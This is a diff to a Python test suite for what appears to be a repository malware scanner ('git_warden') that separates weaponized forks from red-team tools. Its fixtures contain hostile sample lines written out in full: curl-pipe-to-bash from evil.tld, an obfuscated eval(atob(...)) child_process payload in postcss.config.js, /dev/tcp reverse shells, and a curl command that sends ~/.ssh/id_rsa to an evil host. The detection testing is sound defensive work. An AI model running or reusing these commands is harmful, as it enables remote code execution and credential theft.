@@ -39,6 +39,14 @@ class FakeClient:
     def get_readme(self, owner, name):
         return "Install: curl http://evil.tld/x | bash\n"  # remote-exec signal
 
+    def get_repo(self, owner, name):
+        return {"default_branch": "main"}
+
+    def compare(self, base_full, base_branch, head_full, head_branch):
+        # Diverged fork whose changed file is setup.sh (where _fake_clone writes
+        # the added weaponization), so a fork's intent delta is diffable here.
+        return {"ahead_by": 3, "files": ["setup.sh"]}
+
 
 def _fake_clone(full_name, dest, *, runner=None):
     dest.mkdir(parents=True, exist_ok=True)
@@ -72,7 +80,11 @@ def test_hunt_signature_match_finds_novel_repo(tmp_path, monkeypatch):
 
     def clone_mal(full_name, dest, *, runner=None):
         dest.mkdir(parents=True, exist_ok=True)
-        blob = base64.b64encode(b"z" * 200).decode()
+        # Realistic injected payload: decodes to a require/child_process stealer,
+        # so the eval-decoded confirmation can VERIFY the decoded indicators.
+        blob = base64.b64encode(
+            b"global['_']=require;require('child_process').exec('curl http://evil.tld')"
+        ).decode()
         (dest / "postcss.config.js").write_text(
             f"module.exports={{}};eval(atob('{blob}'))\n", encoding="utf-8")
         return dest
@@ -122,7 +134,10 @@ def test_hunt_osm_repo_validation_confirms(tmp_path):
     db.close()
 
 
-def test_hunt_lineage_to_confirmed_gold(tmp_path):
+def test_hunt_lineage_weaponized_fork_confirmed_but_not_published(tmp_path):
+    # A diverged fork that ADDED weaponization is verified internally (confirmed,
+    # so its added-malware IOCs feed the learning loop) -- but a red-team clone is
+    # ONLY a breadcrumb: it is NEVER published to the Wall of Shame or gold feed.
     db = Database.open(tmp_path / "h.sqlite")
     delivered = []
 
@@ -135,21 +150,16 @@ def test_hunt_lineage_to_confirmed_gold(tmp_path):
     )
 
     assert summary["counts"]["candidates"] == 1
-    assert summary["counts"]["screened"] == 1   # malware token + renamed fork
-    assert summary["counts"]["confirmed"] == 1  # Tier-2 bash scan confirmed
-    assert summary["counts"]["gold_delivered"] == 1
-    assert "evil/malware-sliver" in delivered
+    assert summary["counts"]["confirmed"] == 1     # verified (for IOC mining)
+    assert summary["counts"]["gold_delivered"] == 0  # breadcrumb: never delivered
+    assert delivered == []
+    assert db.published_findings() == []           # never on the Wall of Shame
 
     row = db.findings_by_status("confirmed")[0]
     assert row["full_name"] == "evil/malware-sliver"
     payload = json.loads(row["raw_payload"])
-    assert "code_hash" in payload
-    assert row["code_hash"]  # promoted to a column for cross-platform dedup
-    # eval #18: validate WHY it confirmed, not just the count.
-    assert any(s.startswith("static:") for s in json.loads(row["signals"]))
-    assert row["score"] >= 5  # Tier-1 + accumulated bash_score
-    assert "Tier-2 confirmed" in (row["reasoning"] or "")
-    assert payload.get("bash_findings")  # provenance for the gold message
+    assert row["code_hash"]                        # still fingerprinted for dedup
+    assert payload.get("bash_findings")            # evidence retained internally
     db.close()
 
 
@@ -272,4 +282,141 @@ def test_hunt_confirms_weaponized_red_team_fork(tmp_path):
     hunt(db, _DivergedClient(), TOOLS, run_id="hunt-div", now=utcnow(),
          do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
     assert db.findings_by_status("confirmed")  # weaponization in diverged file
+    db.close()
+
+
+def test_hunt_lineage_name_match_is_breadcrumb(tmp_path):
+    # A repo that merely SHARES a pinned tool's name (a cheatsheet, a re-host, a
+    # name collision like CovenantSQL) is not a fork -> no upstream delta to
+    # judge -> breadcrumb, never pinned, even though its docs carry offensive
+    # example commands that would confirm on a full scan.
+    class NameMatchClient(FakeClient):
+        def list_forks(self, owner, name, per_page=100, sort="newest"):
+            return []
+
+        def search_repositories(self, query, per_page=10):
+            if "sliver" in query.lower():
+                return [{"full_name": "writeups/sliver-cheatsheet",
+                         "owner": {"login": "writeups"},
+                         "html_url": "https://github.com/writeups/sliver-cheatsheet",
+                         "fork": False, "stargazers_count": 5,
+                         "pushed_at": "2026-06-10T00:00:00Z"}]
+            return []
+
+    def clone_cheatsheet(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        (dest / "README.md").write_text(  # offensive EXAMPLES, not weaponization
+            "## Example\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
+            "curl -d @~/.ssh/id_rsa https://x.evil\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "nm.sqlite")
+    summary = hunt(db, NameMatchClient(), TOOLS, run_id="nm", now=utcnow(),
+                   do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True,
+                   clone=clone_cheatsheet)
+    row = db.conn.execute(
+        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
+        ("writeups/sliver-cheatsheet",)).fetchone()
+    assert row is not None
+    assert row["detection_method"] == "redteam_lineage"
+    assert row["status"] != "confirmed"            # breadcrumb, NOT pinned
+    assert not db.findings_by_status("confirmed")
+    assert summary["counts"]["redteam_breadcrumbs"] >= 1
+    db.close()
+
+
+def test_hunt_lineage_undiffable_fork_is_breadcrumb(tmp_path):
+    # A fork we cannot diff against upstream (compare unavailable) has no
+    # obtainable intent delta -> breadcrumb, NOT an indiscriminate full-scan
+    # confirmation on the tool's own offensive code.
+    class NoCompareClient(FakeClient):
+        def compare(self, *a, **k):
+            raise RuntimeError("compare unavailable (rate limited)")
+
+    db = Database.open(tmp_path / "nc.sqlite")
+    summary = hunt(db, NoCompareClient(), TOOLS, run_id="nc", now=utcnow(),
+                   do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True,
+                   clone=_fake_clone)
+    assert not db.findings_by_status("confirmed")
+    assert summary["counts"]["redteam_breadcrumbs"] >= 1
+    db.close()
+
+
+def test_hunt_redteam_tool_via_nonlineage_pivot_is_breadcrumb(tmp_path, monkeypatch):
+    # The breadcrumb bug: a red-team TOOL (named like a pinned tool) surfaced by a
+    # NON-lineage pivot (here: signature search) must NOT be pinned malicious on
+    # its own offensive code. With no upstream to diff, a reverse shell is the
+    # tool's purpose, not weaponization -> screened breadcrumb, never confirmed.
+    import git_warden.config as cfg
+    from git_warden.enums import DetectionMethod
+
+    sig_file = tmp_path / "sigs.json"
+    sig_file.write_text('[{"name":"x","query":"SLIVERSIG"}]', encoding="utf-8")
+    monkeypatch.setattr(cfg, "MALWARE_SIGNATURES_PATH", sig_file)
+
+    class SigClient(FakeClient):
+        def search_code(self, query, per_page=20):
+            if "SLIVERSIG" in query:
+                return [{"repository": {
+                    "full_name": "mallory/sliver", "owner": {"login": "mallory"},
+                    "html_url": "https://github.com/mallory/sliver"},
+                    "path": "implant.sh"}]
+            return []
+
+    def clone_tool(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        # The red-team tool's OWN offensive code (a reverse shell). Tier-A alone,
+        # so WITHOUT the breadcrumb gate this would be confirmed malicious.
+        (dest / "implant.sh").write_text(
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "rt.sqlite")
+    summary = hunt(
+        db, SigClient(), TOOLS, run_id="rt", now=utcnow(),
+        do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
+        do_signature=True, do_tier2=True, clone=clone_tool)
+    row = db.conn.execute(
+        "SELECT status, detection_method, reasoning FROM repo_findings WHERE full_name = ?",
+        ("mallory/sliver",)).fetchone()
+    assert row is not None
+    assert row["detection_method"] == DetectionMethod.SIGNATURE_MATCH.value
+    assert row["status"] != "confirmed"           # breadcrumb, NOT pinned
+    assert "red-team tool" in (row["reasoning"] or "")
+    assert not db.findings_by_status("confirmed")  # nothing pinned to the registry
+    assert summary["counts"]["redteam_breadcrumbs"] == 1
+    db.close()
+
+
+def test_hunt_trojaned_impersonation_still_confirms(tmp_path, monkeypatch):
+    # Guard the precision boundary: a homoglyph/typosquat impersonation of a tool
+    # is NOT whitelisted as a breadcrumb (raw name differs), so a real implant in
+    # it still confirms.
+    import git_warden.config as cfg
+
+    sig_file = tmp_path / "sigs.json"
+    sig_file.write_text('[{"name":"x","query":"SLIVERSIG"}]', encoding="utf-8")
+    monkeypatch.setattr(cfg, "MALWARE_SIGNATURES_PATH", sig_file)
+
+    class SigClient(FakeClient):
+        def search_code(self, query, per_page=20):
+            if "SLIVERSIG" in query:
+                return [{"repository": {  # "sl1ver": typosquat, raw name != "sliver"
+                    "full_name": "mallory/sl1ver", "owner": {"login": "mallory"},
+                    "html_url": "https://github.com/mallory/sl1ver"},
+                    "path": "implant.sh"}]
+            return []
+
+    def clone_mal(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        (dest / "implant.sh").write_text(
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "imp.sqlite")
+    hunt(db, SigClient(), TOOLS, run_id="imp", now=utcnow(),
+         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
+         do_signature=True, do_tier2=True, clone=clone_mal)
+    assert any(r["full_name"] == "mallory/sl1ver"
+               for r in db.findings_by_status("confirmed"))
     db.close()
